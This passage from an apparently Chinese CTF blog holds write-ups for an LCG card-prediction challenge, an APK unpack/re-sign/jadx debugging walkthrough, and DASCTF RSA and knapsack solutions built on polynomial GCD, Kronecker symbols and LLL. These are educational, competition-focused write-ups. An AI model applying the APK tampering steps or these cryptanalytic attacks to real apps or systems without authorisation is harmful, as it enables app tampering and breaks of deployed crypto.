<h2 id="CardGame"><a href="#CardGame" class="headerlink" title="CardGame"></a>CardGame</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    #  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure>
<p>没有交互环境<br>注意到选1后的第二三轮会给我们6个LCG中连续的数<br>那么我们就可以恢复LCG的三个系数 从而预测接下来的值<br>注意到这里它要我们给第15个字符(card[x][15])<br>而我们并不知道是多少 但是可以枚举(0-9 AKQJ)<br>只要最后分数达到50分即可</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>2023 - 12 - Diary~</title>
    <url>/2023/12/03/2023-12-Diary/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="bffafb6f43147aeec7aad8ad8b9945a4157c09153eb1cdbd8a11b07685bc57c1"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>DailyPlan</title>
    <url>/2023/12/03/DailyPlan/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ffe355ec83e456715a3ede975e1c4ffa41a5a79bb6516c4b5fb29f7f3d8a161e">84ddd93a2d570b3707d5ad36f450649bd9089ff895aa022e66c86996c1b8d12f6b1a2e7545af9b92c954a9c981a69d03a814e0546808b15197565aa84da9fbdffd598111d62bb2b7441cb3a89a15939735e51debcd048bdf92fa3d4808693b555698723a51925ca7c3cb074886fa27b29df42402ae14b060aed6ca26281572fb5b6410022c9bc099074fd77ad46550242a4de171854d9edd59a42fe8b9c64bbb9037dd899199a5d80f8b49437d87fa7b44bcfd1f9f0bb13a64547677eceac1f00ab0e66d16f93e837cc352e1e12a30816ef6dbe1dafc9a1a3a30a4b0446912140de0b104b19b0cae993bc3843fd8a7626074290dc866897c59c83033f4a914b84adf61a0b652ee9005c9c0e46ec8035da88b7514b8335cf410e083e26cd3df83c0d4d001382f93aea62358d0fcf35f1a6f3b6bae9996a437ec32253cebdf305c3e329570809b8f7a28a09b49975678b89274f18141514680f49c4128f711953db14da40068bd88e0200718bd980a7ee026a69cf621106b0682cf6627680ebf57b04cc4f9e127c7fed5763a148ee9485de6b248fb417ea46b340f6c061cf68154e334ae92e5489047677e82470a6bdc307e885cf4c969385b221542e1b9d6fe8e61d0942f9a6128b32d71d4908f9b32e95aaf3b35ae26896ce276f84a0971e9aed34d2acd1da953faf8638e491d4c5d08f58f93fedf1a7f69a204a7dce0137a87570054e96048b267c3b89e6af05d8f1ebbb1b55bc56c20c2fa5e58417baee2b24b9520d607602bc17861cc9988759c4404e8dc46a24ee0f250d3daa8c7705f5ce5516f2ad0c5fd6b050882d9375a3621f7ab08dbcf9c8d4003055943e34ae372bcc61440ca50b0ea9bdfb152b11fa29675c2cbe7276220c0831c178df4236c885b0dbd1a8d8b5370239728085b44419d68147958db6a604a11d45af091949b2827c261d8d43f9c4501a74f43d51cf574697493715fdd6ad49de46d9c0f6f33bcc269413870fd53893f9ebc4ba7f97d62b83c9fb9c029e5c57a9d07d34f1a06d4ab9c19b5f851d6d67212ee82bb86e5ac933fc2af0e55fcc77b1232fc5b32cff5358c85e58f390cd7dae22bb7a63333d2f259d1aff04db186a2aaafa83a2ccae66de7e22b84d9a1d119be6ee23be7f6f2a8684db3eb846cac6f79de614b227f1a2d8e4c72d026b1db34ba28a4d8b47ca5f3d490a19a1d4f73eaf7b8cf175749193b34cc68d011f353c0501b05b4f995f2f2a70038523f0bd404c3d12c6221b2f97d607b35c4f41842430a9b05ce1b25aad3dd8ebb79ea81808f1cc74497f397b8ee165b199555483cc95d0dc0855b4acc75ec7b43e68883193a61be81a3d7a7f6c8befadb4f6c9a66f071837054c6c08c08dab9e05603201ebc99ca41379abb7d8a20e00892ecc9f05a4a6b32700c9d43ad1823ea1eae901d7f3442ae3e6279b343748c1481e3d0560619ab1ab04fbcf4c760f48f7d533b15cdada84bae85ea794187c80f576d9f6cfadfdcacab901a412ab790925bd8b23f6d76f5aebf9e633bc790198d64b7315a16fd4e6b25296830528f8db8cc4f607a0368583287189f937c0ebacaa4ea88d6656ed24a93135590b491bbd2d6669414f2f0e4f30bf1b0f2cff93c9f523c140d1c2776a3c50c2b8352af40eaa55946250019103b05edfac784f0569c39483bb0978e3fe0ab5f3156f5ec6937e7de5705127ff373a31a286ae3fd6acb77a29a788d5854aff1d265d4cb4a0b56efde5142da40ece1fa2b0c24d71c9ffb8ea0f6f87818cccd05467b742c1ece34eb9ff40f5c9b8a43e01b21ed336ae1792a313780e659dd258bfb8dd66d3462b75fd4ddb85473dd21d72e3e2fed01cbb5bc3fa7c773fd6662185f8ac27ea63d5704fcce3f1e3e85ad23bb0851ba1cf589d13c2bccae8f8d99d5c3cecd3fe2d811bc651279335f123d8a923f7fbe35897d8f26e0a35df37ea8c7a5e7002f30672c8f0ede99e4511f16a5ddbba65515f56be11f698b2176f75256ead99365525be065c97a25e642afd3074538b9ce706fccade0daab34a74ad9b8997fdcf968307ccd32d039835c86cd8a8bd4ab8ce0adc2e35d12bdb70f3ff71b790ca3eadcceb9d11b83c391635fdd6cea95fef0b81c98e9337447875f6d8bc97ffd54971432605403eafc202f91c3ef1970ec9c9b2a0bce85947de71fd6b60d726d821fdb416a5500a9075e05d1db2e37cc2815fbea6cc99879b09a233a0d5786951d1a8ed7a7cf4b7d0bbbc25e95b8d418ab2e89dc8eb4664e215b4751b1fd3bd8cea0bde629cd88148af416b94f1739129c4fa83f656f9bd92411b5c4444cb459e4e38b72bc9a7d823efcf57dcb0f70e717a7fcf9e4b8cf3e1e213e891799403f96ab42fc2f7aa751398b3bba3f0e2cf9a55209198806897317a0bd7d39f8c373a70c991d1defda4173db72f1a906c328efffc2466e3749f566048d55e17055ddb0b1a03bfab9fe4e797b17593742db524b0addd10d02afeb15c1572ca343b633569552c112e3c2106f0851bef6964fd0ab87b0bbac3eb92eb8b4568450dce90b2d521114392b7e7f530e15769d3e9b685c7bdcff4211773bb9b07c01fb15631f13124e1a77599c6d89d4e9a0deab58aa26e3e705662415708b1ebea7c75e8af31b8e4d49406d7ee093825b0d725ef3c4efff086c31f261b5a912fc0d7fdf18120d80f2b7f68c42a8a03c378d0a4a677acb308fe2618ebc67db2d0c91ede51eb33ec29a9268be588a53d5f9723b6df220d808f4553c9953f55a03bab53d928f540720886f486b6ad6074b215c37a4d604fc27ba992d9a50a137affa7c529811247235ffd7a6030be8aec09d61e9bb51bdbaa993c27a1b12ff11f26749d2fbfd72337ffb076686e9331d6fec6dffecb09df9cb496577766f517337fac4deb331740d7c49538765d456ea41d20e28ce776b79f524e5fab9962bb1b95ef87caf97dd7ba95fda581b363a58b5ae0352f5e5b1a710e13a8f170bed36c0011ddd49654b92d1d74b006c15dac83b00eb67b247de6d79172650104a48b66e249327664982bdb1c846dd75a3b6d0f9bc3a22ffb5f567dfe8dd3e5c8ae520a77c54a5a4df82691dd1073372b84f94b72f2bd77e8f788d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>记录第一次jadx APK动调</title>
    <url>/2023/12/03/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1jadx-APK%E5%8A%A8%E8%B0%83/</url>
    <content><![CDATA[<p>这里以NestarCTF2023 WEEK2的AndroDbgme 为例<br>详细记录了关于解包apk 修改manifest 后重签名打包及最后jadx调试的过程</p>
<span id="more"></span>
<p>首先在网上下载apktool(有.jar 和 .bat)<br>然后放在 C&#x2F;Windows下 配置一下环境变量<br>使用命令: apktool  d  xxx.apk 先解包<br>然后在manifest里的这里加上一句 使得允许调试</p>
<p><img src="https://s2.loli.net/2023/12/03/5N24EkviRs3Dbyn.png" alt="1AP~68`_X45`O17@M8SOR_R.png"></p>
<p>apktool  b  xxx 重新打包成apk</p>
<p>由于要重签名 所以要生成keystore<br><code>keytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</code></p>
<p>生成keystore后签名</p>
<p><code>jarsigner -verbose -keystore abc.keystore -signedjar des.apk src.APK abc.keystore</code></p>
<p>签名完毕就可以得到改过manifest的apk了</p>
<p>接下来就是动态调试 我这里用的是 jadx+雷电模拟器</p>
<p>在模拟器启动apk</p>
<p>jadx打开 点击debug</p>
<p><img src="https://s2.loli.net/2023/12/03/thwLBGubS9EMWp4.png" alt="img"></p>
<p>随便下个断点 点击运行 就可以在apk看到flag了</p>
<p><img src="https://s2.loli.net/2023/12/03/4ERAbnhmViyXkzw.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>DASCTF X CBCTF 2023 10</title>
    <url>/2023/12/03/DASCTF-X-CBCTF-2023-10/</url>
    <content><![CDATA[<p>能力有限 只能复现能做的一些题 其他的慢慢补</p>
<span id="more"></span>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>chall.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">f</span>):</span><br><span class="line">    random_chars = <span class="built_in">bytes</span>([random.randint(<span class="number">0</span>, <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line">    f = f + random_chars</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_p</span>(<span class="params">p</span>):</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    </span><br><span class="line">    P = p</span><br><span class="line">    n1 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> jacobi(<span class="number">2</span>,n1) == <span class="number">1</span>:</span><br><span class="line">            n1 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">while</span> P:</span><br><span class="line">            pad = random.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">2023</span>)**<span class="number">2</span> </span><br><span class="line">            message = pad &lt;&lt; <span class="number">1</span> + P % <span class="number">2</span></span><br><span class="line">            cipher = <span class="built_in">pow</span>(message, e, n1)</span><br><span class="line">            f.write(<span class="built_in">str</span>(cipher)+<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            P //= <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n1 = &quot;</span>+ <span class="built_in">str</span>(n1) )    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_q</span>(<span class="params">q</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">q, n</span>):</span><br><span class="line">        e = random.randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">        noise = random.randint(<span class="number">0</span>, n - <span class="number">1</span>)</span><br><span class="line">        c = <span class="built_in">pow</span>(q+noise,e,n)</span><br><span class="line">        <span class="keyword">return</span> e, noise,c </span><br><span class="line">    </span><br><span class="line">    n2 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">    e1, noise1, c1 = encrypt(q, n2)</span><br><span class="line">    e2, noise2, c2 = encrypt(q, n2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n2 = &quot;</span>+ <span class="built_in">str</span>(n2) ) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;(e1, noise1, c1) =&#x27;</span>, (e1,noise1,c1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;(e2, noise2, c2) =&#x27;</span>, (e2,noise2,c2))</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">guess_p(p)</span><br><span class="line">guess_q(q)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag = padding(flag)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line"><span class="string">n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line"><span class="string">(e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983)</span></span><br><span class="line"><span class="string">(e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714)</span></span><br><span class="line"><span class="string">c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这里比赛的时候大概明白这里的Jacobi的玄机 但是只是储备完全不够 瞎猜的几个结论也求不出p<br>求q的部分当时也以为e不同不能sage跑(虽说写了一个copper但好像写假了。。。 要再认真弄懂copper的原理)<br>先跑q:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">    g1 = (x+noise1)^e1-c1</span><br><span class="line">    g2 = (x+noise2)^e2-c2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1,g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2,g1%g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1,g2)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(attack())</span></span><br></pre></td></tr></table></figure>
<p>然后求p<br>首先了解kronecker符号<br><img src="https://s2.loli.net/2023/12/03/VSfdpxDN2AtmHkJ.png" alt="_KE8ATP818UNXM_L6_9A_P2.png"><br>由于Jacobi只是将勒让德的奇素数推广到了奇数<br>而kronecker符号是推广到了一般的整数 更具普适意义</p>
<p>两种情况</p>
<ul>
<li><code>(2x^2)^e</code> </li>
<li><code>(2x^2+1)^e</code></li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/m9Br3gGlnudUvAO.png" alt="AHYCN6UYNIUKOMT____HZPE.png"><br><font color=red size=5>不要忘了欧拉准则！！！二次剩余最初的判断方式！！！</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    i = <span class="built_in">int</span>(i)</span><br><span class="line">    <span class="keyword">if</span>(kronecker(i,n1)==<span class="number">1</span>):</span><br><span class="line">        p = <span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = <span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="comment"># print(int(p,2))</span></span><br></pre></td></tr></table></figure>
<p>或者这种</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(kronecker(i,n1)==-<span class="number">1</span>):</span><br><span class="line">        p = <span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = <span class="string">&#x27;1&#x27;</span>+p</span><br></pre></td></tr></table></figure>
<p>最后的flag<br><img src="https://s2.loli.net/2023/12/03/4bwU5vxHVqXTBIs.png" alt="6R1Y1YM9VKF78ACQ__@FXF0.png"></p>
<h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>粗浅学了下格密码 看了看背包密码LLL破解的本质<br>还是要学会自己造格子<br>这题跟普通的背包不同在于 每6个中必有3个1<br>所以要再加上一列的约束 即 Σxi &#x3D; 24<br>借大佬的图<br><img src="https://s2.loli.net/2023/12/03/7WanPqKwBNDe2gX.png" alt="Y@V1GI@_GOC3F_LV8V_LY_H.png"><br>最后判断就是在常规的-S那列为0后加上最后一列为0<br>solution.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">65651991706497</span>, <span class="number">247831871690373</span>, <span class="number">120247087605020</span>, <span class="number">236854536567393</span>, <span class="number">38795708921144</span>, <span class="number">256334857906663</span>, <span class="number">120089773523233</span>, <span class="number">165349388120302</span>, <span class="number">123968326805899</span>, <span class="number">79638234559694</span>, <span class="number">259559389823590</span>, <span class="number">256776519514651</span>, <span class="number">107733244474073</span>, <span class="number">216508566448440</span>, <span class="number">39327578905012</span>, <span class="number">118682486932022</span>, <span class="number">263357223061004</span>, <span class="number">132872609024098</span>, <span class="number">44605761726563</span>, <span class="number">24908360451602</span>, <span class="number">237906955893793</span>, <span class="number">204469770496199</span>, <span class="number">7055254513808</span>, <span class="number">221802659519968</span>, <span class="number">169686619990988</span>, <span class="number">23128789035141</span>, <span class="number">208847144870760</span>, <span class="number">272339624469135</span>, <span class="number">269511404473473</span>, <span class="number">112830627321371</span>, <span class="number">73203551744776</span>, <span class="number">42843503010671</span>, <span class="number">118193938825623</span>, <span class="number">49625220390324</span>, <span class="number">230439888723036</span>, <span class="number">241486656550572</span>, <span class="number">107149406378865</span>, <span class="number">233503862264755</span>, <span class="number">269502011971514</span>, <span class="number">181805192674559</span>, <span class="number">152612003195556</span>, <span class="number">184127512098087</span>, <span class="number">165959151027513</span>, <span class="number">188723045133473</span>, <span class="number">241615906682300</span>, <span class="number">216101484550038</span>, <span class="number">81190147709444</span>, <span class="number">124498742419309</span>]</span><br><span class="line">re = <span class="number">4051501228761632</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line">K = <span class="number">2</span>^<span class="number">10</span></span><br><span class="line">M = Matrix(ZZ,n+<span class="number">1</span>,n+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i,i] = <span class="number">1</span></span><br><span class="line">    M[i,n] = K*a[i]</span><br><span class="line">    M[i,n+<span class="number">1</span>] = K*<span class="number">1</span></span><br><span class="line">M[n,n] = -K*re</span><br><span class="line">M[n,n+<span class="number">1</span>] = -<span class="number">24</span>*K</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> M.LLL():</span><br><span class="line">    <span class="keyword">if</span>(line[-<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> line[-<span class="number">2</span>]==<span 